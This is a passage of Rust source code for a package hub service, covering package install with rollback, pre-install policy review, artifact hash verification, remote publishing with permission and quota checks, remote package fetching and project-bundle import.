        let mut pipelines_registered = Vec::new();
        for entry in &prepared {
            if let Err(error) = atomic_write(&entry.destination, &entry.bytes) {
                let operation_error = PlatformError::new("HUB_INSTALL", error.to_string());
                return Err(self.recover_failed_install(
                    &target_owner,
                    &target_project,
                    &install_base,
                    &prepared,
                    previous_lock.as_ref(),
                    operation_error,
                ));
            }
        }
        for entry in &prepared {
            if entry.install_rel.ends_with(".zf.json")
                && entry.install_rel.starts_with("pipelines/")
            {
                let source = String::from_utf8(entry.bytes.clone()).map_err(|error| {
                    PlatformError::new(
                        "HUB_INSTALL",
                        format!("pipeline source is not UTF-8: {error}"),
                    )
                })?;
                let (title, trigger_kind) = infer_pipeline_meta(&source, &entry.install_rel);
                let meta = match self.projects.upsert_pipeline_definition(
                    &target_owner,
                    &target_project,
                    &entry.install_rel,
                    &title,
                    "",
                    &trigger_kind,
                    &source,
                ) {
                    Ok(meta) => meta,
                    Err(error) => {
                        return Err(self.recover_failed_install(
                            &target_owner,
                            &target_project,
                            &install_base,
                            &prepared,
                            previous_lock.as_ref(),
                            error,
                        ));
                    }
                };
                pipelines_registered.push(meta.file_rel_path);
            }
        }
        if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
            let dependency_result = self
                .node_registry
                .refresh_project(&target_owner, &target_project)
                .and_then(|_| {
                    self.dependency_lock.record_hub_node_bundles(
                        &target_owner,
                        &target_project,
                        &install_root,
                        source_id,
                        version,
                    )
                })
                .and_then(|_| {
                    self.node_registry
                        .sync_project_node_interfaces(&target_owner, &target_project)
                });
            if let Err(error) = dependency_result {
                return Err(self.recover_failed_install(
                    &target_owner,
                    &target_project,
                    &install_base,
                    &prepared,
                    previous_lock.as_ref(),
                    error,
                ));
            }
        }
        Ok(HubInstallResult {
            package_id: package_id.to_string(),
            version: version.to_string(),
            asset_kind: payload.asset_kind,
            install_root,
            files_written: payload.files.len(),
            pipelines_registered,
        })
    }

    fn install_lock(&self, repo_dir: &Path) -> Arc<Mutex<()>> {
        let mut locks = self
            .install_locks
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        locks
            .entry(repo_dir.to_path_buf())
            .or_insert_with(|| Arc::new(Mutex::new(())))
            .clone()
    }

    fn recover_failed_install(
        &self,
        owner: &str,
        project: &str,
        install_base: &Path,
        entries: &[PreparedHubInstallEntry],
        previous_lock: Option<&crate::contracts::kinds::DependencyLockSpec>,
        operation_error: PlatformError,
    ) -> PlatformError {
        let mut recovery_errors = Vec::new();
        if let Err(error) = restore_hub_install_entries(install_base, entries) {
            recovery_errors.push(error.to_string());
        }
        if let Some(previous) = previous_lock {
            if let Err(error) = self.dependency_lock.write(owner, project, previous) {
                recovery_errors.push(error.to_string());
            }
            if let Err(error) = self.node_registry.refresh_project(owner, project) {
                recovery_errors.push(error.to_string());
            }
        }
        if let Err(error) = self.restore_pipeline_metadata(owner, project, entries) {
            recovery_errors.push(error.to_string());
        }
        if recovery_errors.is_empty() {
            operation_error
        } else {
            PlatformError::new(
                "HUB_INSTALL_RECOVERY",
                format!(
                    "installation failed ({operation_error}); recovery also failed: {}",
                    recovery_errors.join("; ")
                ),
            )
        }
    }

    fn restore_pipeline_metadata(
        &self,
        owner: &str,
        project: &str,
        entries: &[PreparedHubInstallEntry],
    ) -> Result<(), PlatformError> {
        for entry in entries.iter().filter(|entry| {
            entry.install_rel.starts_with("pipelines/") && entry.install_rel.ends_with(".zf.json")
        }) {
            if let Some(previous) = &entry.previous {
                let source = String::from_utf8(previous.clone()).map_err(|error| {
                    PlatformError::new(
                        "HUB_INSTALL_RECOVERY",
                        format!("previous pipeline source is not UTF-8: {error}"),
                    )
                })?;
                let (title, trigger_kind) = infer_pipeline_meta(&source, &entry.install_rel);
                self.projects.upsert_pipeline_definition(
                    owner,
                    project,
                    &entry.install_rel,
                    &title,
                    "",
                    &trigger_kind,
                    &source,
                )?;
            } else {
                self.projects
                    .delete_pipeline(owner, project, &entry.install_rel)?;
            }
        }
        Ok(())
    }

    /// Reviews a package against the channel it would be installed through.
    ///
    /// The channel is not optional detail: a referenced entry's bytes live
    /// there, and a review that cannot fetch them would otherwise scan an empty
    /// string and clear a file the install still writes.
    fn review_artifact_payload(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        payload: &HubPackageSpec,
        artifacts: &HubArtifactChannel,
    ) -> Result<HubInstallReview, PlatformError> {
        let layout = self.projects.project_layout(target_owner, target_project)?;
        let install_root =
            install_root_for_target_folder(package_id, &payload.asset_kind, target_folder);
        // The same choice the install makes, so what the review calls an
        // overwrite is what the install would actually overwrite.
        let install_base = if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
            &layout.data_dir
        } else {
            &layout.repo_dir
        };
        let mut files_added = Vec::new();
        let mut files_overwritten = Vec::new();
        let mut pipelines_registered = Vec::new();
        let mut policy_entries = Vec::new();

        for entry in &payload.files {
            let install_rel = install_rel_path_under_folder(&install_root, &entry.rel_path);
            let dest_abs = install_base.join(&install_rel);
            if dest_abs.exists() {
                files_overwritten.push(install_rel.clone());
            } else {
                files_added.push(install_rel.clone());
            }
            if install_rel.ends_with(".zf.json") && install_rel.starts_with("pipelines/") {
                pipelines_registered.push(install_rel.clone());
            }
            // Keyed on the destination, never the manifest path: the install
            // decides where an entry lands, so the review scans the same path
            // the install would register.
            policy_entries.push(package_policy_entry(&install_rel, entry, artifacts));
        }
        let mut policy =
            review_package_entries(&policy_entries, Vec::new(), PackageReviewOptions::default());
        policy.risk_level = install_risk_level(&policy, !files_overwritten.is_empty());

        Ok(HubInstallReview {
            package_id: package_id.to_string(),
            version: version.to_string(),
            target_folder: target_folder.to_string(),
            install_root,
            asset_kind: payload.asset_kind.clone(),
            files_added,
            files_overwritten,
            pipelines_registered,
            nodes_used: policy.nodes_used,
            credentials_required: policy.credentials_required,
            external_urls: policy.external_urls,
            database_effects: policy.database_effects,
            filesystem_effects: policy.filesystem_effects,
            public_endpoints: policy.public_endpoints,
            schedules: policy.schedules,
            large_files: policy.large_files,
            seed_data: policy.seed_data,
            project_initialization: serde_json::to_value(&payload.project_initialization)
                .unwrap_or_else(|_| Value::Null),
            installable: policy.violations.is_empty(),
            violations: policy.violations,
            warnings: policy.warnings,
            risk_level: policy.risk_level,
        })
    }

    pub fn get_asset_version_artifact(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<(HubAssetVersion, Value), PlatformError> {
        let (version_row, artifact, _) =
            self.get_asset_version_install_artifact(package_id, version)?;
        Ok((version_row, artifact))
    }

    pub fn get_asset_version_install_artifact(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<(HubAssetVersion, Value, u64), PlatformError> {
        self.require_enabled()?;
        let Some(version_row) = self.hub_data.get_hub_asset_version(package_id, version)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset version not found",
            ));
        };
        let artifact_abs = self.hub_artifact_path(&version_row.artifact_rel_path)?;
        let artifact_size_bytes = fs::metadata(&artifact_abs)?.len();
        if artifact_size_bytes > MAX_REMOTE_HUB_ARTIFACT_BYTES {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_TOO_LARGE",
                "hub artifact exceeds maximum read size",
            ));
        }
        let raw = fs::read(&artifact_abs)?;
        let actual_sha256 = sha256_hex(&raw);
        if actual_sha256 != version_row.artifact_sha256 {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_INTEGRITY",
                format!(
                    "hub artifact hash mismatch: expected {}, got {}",
                    version_row.artifact_sha256, actual_sha256
                ),
            ));
        }
        let artifact = serde_json::from_slice::<Value>(&raw)
            .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
        Ok((version_row, artifact, artifact_size_bytes))
    }

    pub fn get_latest_asset_media(
        &self,
        package_id: &str,
        media_name: &str,
    ) -> Result<(HubAssetPackage, HubAssetMedia, Vec<u8>), PlatformError> {
        self.require_enabled()?;
        let Some(package) = self.hub_data.get_hub_asset_package(package_id)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset package not found",
            ));
        };
        // Presentation lives beside the releases, so a cover resolves from the
        // package row and the artifact store without opening any release
        // document — and stays reachable when a typo is corrected.
        let Some(media) = package
            .media
            .iter()
            .find(|item| item.name == media_name)
            .cloned()
        else {
            return Err(PlatformError::new("HUB_MEDIA_MISSING", "media not found"));
        };
        let bytes = self.artifact_store().resolve(
            &media.name,
            &HubPackageArtifactRef {
                sha256: media.artifact_sha256.clone(),
                media_type: media.content_type.clone(),
            },
            media.size_bytes,
        )?;
        Ok((package, media, bytes))
    }

    pub fn import_remote_asset(
        &self,
        authority_owner: &str,
        authority_project: &str,
        token: &HubToken,
        req: &RemoteHubPublishRequest,
    ) -> Result<(HubAssetPackage, HubAssetVersion), PlatformError> {
        let _ = (authority_owner, authority_project);
        self.require_enabled()?;
        let authority_owner = HUB_SERVICE_SCOPE_OWNER.to_string();
        let authority_project = HUB_SERVICE_SCOPE_PROJECT.to_string();
        let publisher_owner = slug_segment(&token.owner);
        let publisher_id = slug_segment(&token.publisher_id);
        let package_id = canonical_hub_package_id(&publisher_id, &req.package_id)?;
        let version = req.version.trim().to_string();
        if authority_owner.is_empty()
            || authority_project.is_empty()
            || publisher_owner.is_empty()
            || publisher_id.is_empty()
            || package_id.is_empty()
            || version.is_empty()
        {
            return Err(PlatformError::new(
                "HUB_REMOTE_INVALID",
                "authority, publisher, package id, and version must not be empty",
            ));
        }
        validate_hub_version(&version)?;
        let Some(publisher) = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        if !publisher.enabled {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_DISABLED",
                "publisher is disabled",
            ));
        }
        if !publisher.can_publish {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_FORBIDDEN",
                "publisher does not have publish permission",
            ));
        }
        // The remote publish route lands here, and it carries the same
        // release-immutability rule as a local publish. Checked before the
        // inbound document is decoded, so nothing durable is written.
        self.enforce_release_immutability(&package_id, &version)?;
        let source_owner = slug_segment(&req.source_owner);
        let source_project = slug_segment(&req.source_project);
        let mut artifact = parse_hub_artifact_value(req.artifact.clone(), "HUB_REMOTE_INVALID")?;
        if artifact.files.is_empty() {
            return Err(PlatformError::new(
                "HUB_REMOTE_INVALID",
                "artifact must contain at least one file",
            ));
        }
        // Presentation arrives beside the release, not inside it. Its images
        // are validated, then stored content-addressed so only a digest is
        // recorded against the package.
        let decoded_media = decode_remote_hub_media(&req.media, &publisher)?;
        let media = decoded_media
            .iter()
            .map(|(item, _)| item.clone())
            .collect::<Vec<_>>();
        validate_hub_gallery(&req.gallery, &media)?;
        let image_url =
            req.gallery
                .cover
                .as_ref()
                .map(|item| {
                    format!(
                        "/api/hub/remote/assets/{package_id}/media/{}",
                        item.media_name
                    )
                })
                .or_else(|| {
                    media.iter().find(|item| item.role == "cover").map(|item| {
                        format!("/api/hub/remote/assets/{package_id}/media/{}", item.name)
                    })
                })
                .unwrap_or_default();
        sanitize_hub_export_entries(&mut artifact.files)?;
        let artifact_rel = format!(
            "services/{}/packages/{}/versions/{}/artifact.json",
            DEFAULT_HUB_SERVICE_INSTANCE_ID, package_id, version
        );
        let artifact_abs = self.data_root.join(&artifact_rel);
        if let Some(parent) = artifact_abs.parent() {
            fs::create_dir_all(parent)?;
        }
        let artifact_bytes =
            encode_hub_artifact(&package_id, &version, &artifact, "HUB_REMOTE_INVALID")?;
        let artifact_value = serde_json::from_slice(&artifact_bytes)
            .map_err(|err| PlatformError::new("HUB_REMOTE_INVALID", err.to_string()))?;
        let now = now_ts();
        let authority = self.ensure_service_authority()?;
        let existing_package = self.hub_data.get_hub_asset_package(&package_id)?;
        self.enforce_publisher_package_quota(
            &publisher,
            &package_id,
            existing_package.as_ref(),
            artifact_bytes.len(),
        )?;
        atomic_write(&artifact_abs, &artifact_bytes)?;
        for (item, bytes) in &decoded_media {
            let stored = self.store_artifact(bytes)?;
            if stored != item.artifact_sha256 {
                return Err(PlatformError::new(
                    "HUB_MEDIA_INVALID",
                    "stored media digest does not match the declared hash",
                ));
            }
        }
        let package = HubAssetPackage {
            package_pk: existing_package
                .as_ref()
                .map(|item| item.package_pk.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or_else(|| format!("mpkg_{}", random_hex(8))),
            authority_id: authority.authority_id.clone(),
            publisher_pk: publisher.publisher_pk.clone(),
            package_id: package_id.clone(),
            authority_owner: authority_owner.clone(),
            authority_project: authority_project.clone(),
            publisher_owner: publisher_owner.clone(),
            publisher_id: publisher_id.clone(),
            publisher_display_name: publisher.display_name.clone(),
            publisher_url: publisher.publisher_url.clone(),
            publisher_email: publisher.email.clone(),
            asset_kind: validate_hub_asset_kind(&artifact.asset_kind)?,
            title: if req.title.trim().is_empty() {
                artifact.title.clone()
            } else {
                req.title.trim().to_string()
            },
            description: if req.description.trim().is_empty() {
                artifact.description.clone()
            } else {
                req.description.trim().to_string()
            },
            summary: req.summary.trim().to_string(),
            description_md: req.description_md.clone(),
            image_url,
            media,
            gallery: req.gallery.clone(),
            visibility: normalize_visibility(&req.visibility),
            tags: req.tags.clone(),
            created_at: existing_package.map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        let version_row = HubAssetVersion {
            package_pk: package.package_pk.clone(),
            package_id,
            version,
            authority_owner,
            authority_project,
            publisher_owner,
            publisher_id,
            source_owner,
            source_project,
            source_kind: req.source_kind.clone(),
            source_ref: req.source_ref.clone(),
            artifact_rel_path: artifact_rel,
            artifact_sha256: sha256_hex(&artifact_bytes),
            manifest: artifact_value,
            // New row by construction — see the note on the local publish path.
            created_at: now,
        };
        self.hub_data.put_hub_asset_package(&package)?;
        self.hub_data.put_hub_asset_version(&version_row)?;
        Ok((package, version_row))
    }

    pub async fn fetch_remote_pack_rows(
        &self,
        http_client: &reqwest::Client,
        owner: &str,
        project: &str,
    ) -> Result<Vec<HubRemotePackRow>, PlatformError> {
        let repos = self.list_effective_repositories(owner, project)?;
        let mut out = Vec::new();
        for repo in repos.into_iter().filter(|item| item.enabled) {
            let url = remote_hub_url(&repo, "remote/assets");
            validate_remote_hub_url(&url)?;
            let mut req = http_client.get(url);
            if !repo.read_token.trim().is_empty() {
                req = req.bearer_auth(repo.read_token.trim());
            }
            let response = req
                .send()
                .await
                .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
            if !response.status().is_success() {
                continue;
            }
            let payload: RemoteHubListResponse = response
                .json()
                .await
                .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
            out.extend(payload.items.into_iter().map(|item| HubRemotePackRow {
                repository_id: repo.repository_id.clone(),
                repository_title: repo.title.clone(),
                package_id: item.package_id,
                publisher_owner: item.publisher_owner,
                publisher_id: item.publisher_id,
                publisher_display_name: item.publisher_display_name,
                publisher_url: item.publisher_url,
                publisher_email: item.publisher_email,
                asset_kind: item.asset_kind,
                title: item.title,
                description: item.description,
                summary: item.summary,
                image_url: item.image_url,
                gallery: item.gallery,
                visibility: item.visibility,
                tags: item.tags,
                latest_version: item.latest_version,
                updated_at: item.updated_at,
                source: "remote".to_string(),
            }));
        }
        Ok(out)
    }

    pub async fn fetch_platform_remote_app_rows(
        &self,
        http_client: &reqwest::Client,
        owner: &str,
    ) -> Result<Vec<HubRemotePackRow>, PlatformError> {
        let repos = self.list_platform_repositories(owner)?;
        self.fetch_platform_remote_app_rows_from_repositories(http_client, repos)
            .await
    }

    pub async fn fetch_platform_remote_app_rows_from_repositories(
        &self,
        http_client: &reqwest::Client,
        repos: Vec<PlatformHubRepository>,
    ) -> Result<Vec<HubRemotePackRow>, PlatformError> {
        let mut out = Vec::new();
        for repo in repos.into_iter().filter(|item| item.enabled) {
            let url = remote_hub_url_for_platform(&repo, "remote/assets");
            validate_remote_hub_url(&url)?;
            let mut req = http_client.get(url);
            if !repo.read_token.trim().is_empty() {
                req = req.bearer_auth(repo.read_token.trim());
            }
            let response = match req.send().await {
                Ok(response) => response,
                Err(_) => continue,
            };
            if !response.status().is_success() {
                continue;
            }
            let payload: RemoteHubListResponse = match response.json().await {
                Ok(payload) => payload,
                Err(_) => continue,
            };
            out.extend(
                payload
                    .items
                    .into_iter()
                    .filter(|item| item.asset_kind == HUB_ASSET_KIND_PROJECT_BUNDLE)
                    .map(|item| HubRemotePackRow {
                        repository_id: repo.repository_id.clone(),
                        repository_title: repo.title.clone(),
                        package_id: item.package_id,
                        publisher_owner: item.publisher_owner,
                        publisher_id: item.publisher_id,
                        publisher_display_name: item.publisher_display_name,
                        publisher_url: item.publisher_url,
                        publisher_email: item.publisher_email,
                        asset_kind: item.asset_kind,
                        title: item.title,
                        description: item.description,
                        summary: item.summary,
                        image_url: item.image_url,
                        gallery: item.gallery,
                        visibility: item.visibility,
                        tags: item.tags,
                        latest_version: item.latest_version,
                        updated_at: item.updated_at,
                        source: "remote".to_string(),
                    }),
            );
        }
        Ok(out)
    }

    pub async fn install_remote_pack_from_repository(
        &self,
        http_client: &reqwest::Client,
        target_owner: &str,
        target_project: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
    ) -> Result<HubInstallResult, PlatformError> {
        let repo = self
            .list_effective_repositories(target_owner, target_project)?
            .into_iter()
            .find(|item| item.repository_id == repository_id)
            .ok_or_else(|| PlatformError::new("HUB_REPOSITORY_MISSING", "repository not found"))?;
        let url = remote_hub_url(
            &repo,
            &format!("remote/assets/{}/{}/artifact", package_id, version),
        );
        validate_remote_hub_url(&url)?;
        let mut req = http_client.get(url);
        if !repo.read_token.trim().is_empty() {
            req = req.bearer_auth(repo.read_token.trim());
        }
        let response = req
            .send()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        if !response.status().is_success() {
            return Err(PlatformError::new(
                "HUB_REMOTE_FETCH",
                format!("remote fetch failed with {}", response.status()),
            ));
        }
        let payload: RemoteHubArtifactResponse = response
            .json()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        verify_remote_artifact_hash(&payload)?;
        let artifact = parse_hub_artifact_value(payload.artifact, "HUB_REMOTE_INVALID")?;
        self.install_artifact_payload(
            slug_segment(target_owner),
            slug_segment(target_project),
            package_id,
            version,
            target_folder,
            &format!("{repository_id}/{package_id}"),
            artifact,
        )
    }

    pub async fn review_remote_pack_from_repository(
        &self,
        http_client: &reqwest::Client,
        target_owner: &str,
        target_project: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
    ) -> Result<HubInstallReview, PlatformError> {
        let repo = self
            .list_effective_repositories(target_owner, target_project)?
            .into_iter()
            .find(|item| item.repository_id == repository_id)
            .ok_or_else(|| PlatformError::new("HUB_REPOSITORY_MISSING", "repository not found"))?;
        let url = remote_hub_url(
            &repo,
            &format!("remote/assets/{}/{}/artifact", package_id, version),
        );
        validate_remote_hub_url(&url)?;
        let mut req = http_client.get(url);
        if !repo.read_token.trim().is_empty() {
            req = req.bearer_auth(repo.read_token.trim());
        }
        let response = req
            .send()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        if !response.status().is_success() {
            return Err(PlatformError::new(
                "HUB_REMOTE_FETCH",
                format!("remote fetch failed with {}", response.status()),
            ));
        }
        let payload: RemoteHubArtifactResponse = response
            .json()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        verify_remote_artifact_hash(&payload)?;
        let artifact = parse_hub_artifact_value(payload.artifact, "HUB_REMOTE_INVALID")?;
        self.review_artifact_payload(
            &slug_segment(target_owner),
            &slug_segment(target_project),
            package_id,
            version,
            target_folder,
            &artifact,
            &HubArtifactChannel::unresolvable(CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION),
        )
    }

    pub async fn install_remote_project_from_platform_repository(
        &self,
        http_client: &reqwest::Client,
        owner: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
    ) -> Result<(String, String), PlatformError> {
        self.install_remote_project_from_platform_source(
            http_client,
            owner,
            owner,
            repository_id,
            package_id,
            version,
        )
        .await
    }

    pub async fn install_remote_project_from_platform_source(
        &self,
        http_client: &reqwest::Client,
        source_owner: &str,
        target_owner: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
    ) -> Result<(String, String), PlatformError> {
        let source_owner = slug_segment(source_owner);
        let target_owner = slug_segment(target_owner);
        let repo = self
            .list_platform_repositories(&source_owner)?
            .into_iter()
            .find(|item| item.repository_id == repository_id)
            .ok_or_else(|| PlatformError::new("HUB_REPOSITORY_MISSING", "repository not found"))?;
        let url = remote_hub_url_for_platform(
            &repo,
            &format!("remote/assets/{}/{}/artifact", package_id, version),
        );
        validate_remote_hub_url(&url)?;
        let mut req = http_client.get(url);
        if !repo.read_token.trim().is_empty() {
            req = req.bearer_auth(repo.read_token.trim());
        }
        let response = req
            .send()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        if !response.status().is_success() {
            return Err(PlatformError::new(
                "HUB_REMOTE_FETCH",
                format!("remote fetch failed with {}", response.status()),
            ));
        }
        let payload: RemoteHubArtifactResponse = response
            .json()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        verify_remote_artifact_hash(&payload)?;
        let mut artifact =
            parse_hub_artifact_value(payload.artifact.clone(), "HUB_REMOTE_INVALID")?;
        if validate_hub_asset_kind(&artifact.asset_kind)? != HUB_ASSET_KIND_PROJECT_BUNDLE {
            return Err(PlatformError::new(
                "HUB_REMOTE_INVALID",
                "platform hub install only supports project bundles",
            ));
        }
        let base_project = slug_segment(package_id);
        if base_project.is_empty() {
            return Err(PlatformError::new(
                "HUB_REMOTE_INVALID",
                "package id is not a valid project slug",
            ));
        }
        let project_title = if artifact.title.trim().is_empty() {
            package_id.to_string()
        } else {
            artifact.title.clone()
        };
        let mut suffix = 1usize;
        let project = loop {
            let candidate = if suffix == 1 {
                base_project.clone()
            } else {
                format!("{base_project}-{suffix}")
            };
            if self
                .control_data
                .get_project(&target_owner, &candidate)?
                .is_some()
            {
                suffix += 1;
                continue;
            }
            match self.projects.create_or_update_project(
                &target_owner,
                &CreateProjectRequest {
                    project: candidate.clone(),
                    title: Some(project_title.clone()),
                    local_branch: None,
                    runtime: ProjectRuntimeSelectionRequest::default(),
                },
            ) {
                Ok(_) => break candidate,
                Err(err)
                    if err.code == "PLATFORM_GIT_INIT"
                        || err.code == "PROJECT_EXISTS"
                        || err.code == "PLATFORM_PROJECT_EXISTS" =>
                {
                    suffix += 1;
                    continue;
                }
                Err(err) => return Err(err),
            }
        };
        let layout = self.projects.project_layout(&target_owner, &project)?;
        retarget_project_configuration(&mut artifact.files, &project)?;
        retarget_dependency_lock(&mut artifact.files, &project)?;
        // A remote pack carries its bytes in the document it just fetched, so
        // there is no artifact location to fetch a reference from. Resolving
        // before the worktree is cleared keeps a refusal from destroying the
        // project it was about to fill.
        let artifacts = HubArtifactChannel::unresolvable(
            "a remote pack has no artifact endpoint, so referenced bytes cannot be fetched",
        );
        for entry in &artifact.files {
            if !matches!(entry.supply(), Some(HubPackageFileSupply::Carried(_))) {
                hub_entry_bytes(entry, &artifacts)?;
            }
        }
        clear_repo_worktree_preserving_git(&layout.repo_dir)?;
        for entry in &artifact.files {
            let dest_abs = sanitize_install_repo_path(&layout, &entry.rel_path)?;
            if let Some(parent) = dest_abs.parent() {
                fs::create_dir_all(parent)?;
            }
            write_entry_content(&dest_abs, entry, &artifacts)?;
        }
        reindex_project_bundle_pipelines(self, &target_owner, &project, &artifact.files)?;
        sekejap::apply_schema_from_repo(&self.data_root, &target_owner, &project)?;
        sqlite_schema::apply_schema_from_repo(&self.data_root, &target_owner, &project)?;
        execute_project_initial_data(
            &self.data_root,
            &target_owner,
            &project,
            &layout,
            &artifact.project_initialization.initial_data,
        )?;
        for file_rel_path in &artifact.active_pipelines {
            let normalized = normalize_repo_rel(file_rel_path);
            if normalized.is_empty() || !normalized.ends_with(".zf.json") {
                continue;
            }
            self.projects
                .activate_pipeline_definition(&target_owner, &project, &normalized)?;
        }
        Ok((target_owner, project))
    }

    fn preview_pipeline(
        &self,
        owner: &str,
        project: &str,
        layout: &ProjectFileLayout,
        source_ref: &str,
    ) -> Result<HubExportPreview, PlatformError> {
        let Some(meta) = self
            .projects
            .get_pipeline_meta_by_file_id(owner, project, source_ref)?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISH_MISSING",
                format!("pipeline '{}' not found", source_ref),
            ));
        };
        let mut warnings = Vec::new();
        let mut entries = vec![read_repo_entry(
            layout,
            &meta.file_rel_path,
            "primary pipeline".to_string(),
        )?];
        let source = self
            .projects
            .read_pipeline_source(owner, project, &meta.file_rel_path)?;
        let value: Value = serde_json::from_str(&source)
            .map_err(|err| PlatformError::new("HUB_PREVIEW", err.to_string()))?;
        let mut seen = BTreeSet::new();
        seen.insert(meta.file_rel_path.clone());
        if let Some(nodes) = value.get("nodes").and_then(Value::as_array) {
            for node in nodes {
                if node.get("kind").and_then(Value::as_str) != Some("n.web.response") {
                    continue;
                }
                let Some(template_rel) = node
                    .get("config")
                    .and_then(|cfg| cfg.get("template"))
                    .and_then(Value::as_str)
                else {
                    continue;
                };
                self.collect_template_dependency_entries(
                    layout,
                    template_rel,
                    "web response template".to_string(),
                    &mut seen,
                    &mut entries,
                    &mut warnings,
                )?;
            }
        }
        entries.sort_by(|a, b| a.rel_path.cmp(&b.rel_path));
        Ok(build_preview(
            HUB_ASSET_KIND_PIPELINE_BUNDLE.to_string(),
            "pipeline_with_dependencies".to_string(),
            meta.file_rel_path.clone(),
            meta.title,
            if meta.description.trim().is_empty() {
                "Pipeline export with local project dependencies".to_string()
            } else {
                meta.description
            },
            entries,
            warnings,
        ))
    }

    fn preview_template(
        &self,
        owner: &str,
        project: &str,
        layout: &ProjectFileLayout,
        source_ref: &str,
    ) -> Result<HubExportPreview, PlatformError> {
        let listing = self.projects.list_template_workspace(owner, project)?;
        let selected = listing
            .items
            .into_iter()
            .find(|item| item.kind != "folder" && item.rel_path == source_ref)
            .ok_or_else(|| {
                PlatformError::new(
                    "HUB_PUBLISH_MISSING",
                    format!("template '{}' not found", source_ref),
                )
            })?;
        let mut warnings = Vec::new();
        let mut entries = Vec::new();
        let mut seen = BTreeSet::new();
        self.collect_template_dependency_entries(
            layout,
            &selected.rel_path,
            "primary template".to_string(),
            &mut seen,
            &mut entries,
            &mut warnings,
        )?;
        entries.sort_by(|a, b| a.rel_path.cmp(&b.rel_path));
        Ok(build_preview(
            HUB_ASSET_KIND_TEMPLATE_BUNDLE.to_string(),
            "template_with_dependencies".to_string(),
            selected.rel_path.clone(),
            selected.name,
            format!(
                "Template export with {} local dependencies",
                entries.len().saturating_sub(1)
            ),
            entries,
            warnings,
        ))
    }

    fn preview_folder(
        &self,
        layout: &ProjectFileLayout,
        source_ref: &str,
    ) -> Result<HubExportPreview, PlatformError> {
        let mut entries = collect_tree_entries(layout, source_ref)?;
        entries.sort_by(|a, b| a.rel_path.cmp(&b.rel_path));
        let name = Path::new(source_ref)
            .file_name()
            .and_then(|v| v.to_str())
            .unwrap_or(source_ref)
            .to_string();
        Ok(build_preview(
            HUB_ASSET_KIND_FOLDER_BUNDLE.to_string(),
            "folder_files".to_string(),
            source_ref.to_string(),
            name,
            "Recursive folder export".to_string(),
            entries,
            Vec::new(),
        ))
    }

    fn preview_project(
        &self,
        layout: &ProjectFileLayout,
    ) -> Result<HubExportPreview, PlatformError> {
        let mut entries = collect_tree_entries(layout, ".")?;
        entries.sort_by(|a, b| a.rel_path.cmp(&b.rel_path));
        Ok(build_preview(
            HUB_ASSET_KIND_PROJECT_BUNDLE.to_string(),
            "project_files".to_string(),
            ".".to_string(),
            "Project files".to_string(),
            "Full repo export".to_string(),
            entries,
            Vec::new(),
        ))
    }

    fn collect_template_dependency_entries(
        &self,
        layout: &ProjectFileLayout,
        rel_path: &str,
        reason: String,
        seen: &mut BTreeSet<String>,
        entries: &mut Vec<HubPackageFile>,
        warnings: &mut Vec<String>,
    ) -> Result<(), PlatformError> {
        let normalized = normalize_template_repo_rel(rel_path);
        if normalized.is_empty() || !seen.insert(normalized.clone()) {
            return Ok(());
        }
        let abs = layout.repo_dir.join(&normalized);
        if !abs.is_file() {
            warnings.push(format!("Skipped missing dependency '{}'", normalized));
            return Ok(());
        }
        let entry = read_repo_entry(layout, &normalized, reason)?;
        let source_text = if entry.encoding == "text" {
            entry.content.clone()
        } else {
            None
        };
        entries.push(entry);
        let Some(source_text) = source_text else {
            return Ok(());
        };
        let import_sources = extract_import_sources(&source_text);
        for src in import_sources {
            match resolve_local_import(layout, &normalized, &src) {
                Some(dep_rel) => self.collect_template_dependency_entries(
                    layout,
                    &dep_rel,
                    format!("imported from {}", normalized),
                    seen,
                    entries,
                    warnings,
                )?,
                None => {
                    if src.starts_with("@/") || src.starts_with('.') {
                        warnings.push(format!(
                            "Skipped unresolved local import '{}' from '{}'",
                            src, normalized
                        ));
                    }
                }
            }
        }
        Ok(())
    }
}

impl HubService {
    fn require_enabled(&self) -> Result<PlatformServiceInstance, PlatformError> {
        match self.get_default_service_instance()? {
            Some(service) if service.enabled => Ok(service),
            _ => Err(PlatformError::new(
                "HUB_SERVICE_DISABLED",
                "hub service is not enabled",
            )),
        }
    }

    fn ensure_service_authority(&self) -> Result<HubAuthority, PlatformError> {
        if let Some(authority) = self
            .hub_data
            .get_hub_authority(HUB_SERVICE_SCOPE_OWNER, HUB_SERVICE_SCOPE_PROJECT)?
        {
